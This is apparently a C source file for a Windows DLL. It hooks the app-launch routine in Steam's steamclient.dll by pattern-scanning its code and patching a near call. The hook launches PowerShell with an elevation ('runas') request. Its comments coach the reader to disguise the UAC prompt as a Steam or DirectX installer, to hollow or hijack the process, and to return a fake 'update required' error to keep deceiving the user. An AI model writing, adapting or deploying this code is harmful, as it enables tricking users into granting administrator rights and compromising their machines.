#include <stdint.h>
#include <string.h>
#include <Windows.h>

#include "patching/patches.h"
#include "utils/utils.h"

#if !defined(_MSC_VER)
// fix calling convention, as we are simulating a __thiscall with __fastcall
#error "unsupported compiler"
#endif // !defined(_MSC_VER)

static void* call_ptr;
static void* original;

typedef int(__fastcall* launch_app)(void* this,
                                    void* edx,
                                    const char* a2,
                                    const char* a3,
                                    const char* a4,
                                    int a5,
                                    int a6,
                                    uint16_t a7,
                                    int a8,
                                    int a9,
                                    int a10,
                                    int a11,
                                    DWORD* a12);

static int __fastcall hook_launch_app(void* this,
                                      void* edx,
                                      const char* a2,
                                      const char* a3,
                                      const char* a4,
                                      int a5,
                                      int a6,
                                      uint16_t a7,
                                      int a8,
                                      int a9,
                                      int a10,
                                      int a11,
                                      DWORD* a12) {
  SHELLEXECUTEINFOA shell_exec;
  launch_app original_launch_app = original;

  // You'll get a process handle. Spawn a legitimate steam process, suspend,
  // hollow it or hijack and do as you wish. Doesn't bypass UAC, so make it
  // seem legit with steamservice.exe, directx installation stuff or similar
  memset(&shell_exec, 0, sizeof(shell_exec));
  shell_exec.cbSize = sizeof(shell_exec);
  shell_exec.fMask = SEE_MASK_NOCLOSEPROCESS;
  shell_exec.lpVerb = "runas";
  shell_exec.lpFile = "powershell.exe";
  shell_exec.nShow = SW_SHOW;

  if (!ShellExecuteExA(&shell_exec))
    return 19; // return an "update required" error code, to trick further

  // be creative, create a thread or something
  if (shell_exec.hProcess != INVALID_HANDLE_VALUE &&
      shell_exec.hProcess != NULL)
    CloseHandle(shell_exec.hProcess);

  return original_launch_app(this, edx, a2, a3, a4, a5, a6, a7, a8, a9, a10,
                             a11, a12);
}

static void install_hooks(void) {
  struct bin_section text;
  HMODULE steamclient;

  steamclient = GetModuleHandleA("steamclient.dll");
  if (steamclient == NULL)
    return;
  if (0 > get_section(steamclient, ".text", &text))
    return;
  call_ptr = pattern_scan(
      &text,
      "\xe8\x00\x00\x00\x00\x8b\xf8\x85\xff\x0f\x84\x00\x00\x00\x00"
      "\x83\xff\x2e\x0f\x85",
      "x????xxxxxx????xxxxx");
  if (call_ptr == NULL)
    return;
  
  patch_near_call(call_ptr, (void*)hook_launch_app, (BYTE**)&original);
  return;
}

static void uninstall_hooks(void) {
  HMODULE steamclient;

  steamclient = GetModuleHandleA("steamclient.dll");
  if (steamclient == NULL)
    return;  
  if (call_ptr == NULL)
    return;

  patch_near_call(call_ptr, original, (BYTE**)&original);
  return;
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
  // HANDLE thread;
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      install_hooks();
      break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      uninstall_hooks();
      break;
  }
  return TRUE;
}

